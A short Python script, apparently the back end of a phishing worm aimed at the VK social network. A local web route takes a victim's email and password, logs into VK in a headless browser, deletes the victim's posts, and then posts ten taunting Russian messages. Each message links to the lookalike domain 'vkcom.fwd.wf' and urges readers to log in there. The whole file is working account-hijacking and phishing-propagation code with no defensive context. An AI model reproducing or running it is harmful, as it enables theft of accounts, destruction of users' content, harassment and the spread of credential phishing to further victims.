from bottle import route, run, template
import time
import random
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

url = 'https://vk.com/'
posts = [
'Позорник ты...',
'Хорошо сыграно, брат тебе в театральный надо ахаха',
'Лолллл, кек, корвалол',
'Скажите мне где этот тип живет!!! Стена закрыта, там залогиньтесь.. '
]

@route('/login/<email>/<password>')
def index(email, password):
    driver = webdriver.PhantomJS()
    driver.set_window_size(2000, 1500)
    driver.get(url)

    try:
        driver.execute_script("document.getElementById('index_email').value = '" + email + "'")
        driver.execute_script("document.getElementById('index_pass').value = '" + password + "'")
        # driver.execute_script("document.getElementById('index_login_form').submit()")
        driver.find_element_by_css_selector('#index_login_button').click()
        time.sleep(5)
        driver.execute_script("window.location = document.getElementsByClassName('left_row')[0].href")
        time.sleep(3)
        driver.execute_script("for(var i = 0; i < document.getElementsByClassName('ui_actions_menu_item').length; i++){if(document.getElementsByClassName('ui_actions_menu_item')[i].innerHTML === 'Delete post'){document.getElementsByClassName('ui_actions_menu_item')[i].click()}}")
        driver.execute_script("window._createPost = function(text){document.getElementById('post_field').innerHTML = text; document.getElementById('send_post').click()}")
        driver.execute_script("for(var i = 0; i < 10; i++){window._createPost('" + random.choice(posts) + " http://vkcom.fwd.wf')}")
        # driver.get_screenshot_as_file('page.png')
        
        print("Scripts executed...")

        driver.close()
    except TimeoutException:
            print("Loading took too much time!")

    return template('<b>Hello {{email}} {{password}}</b>', email=email, password=password)

run(host='localhost', port=8080)
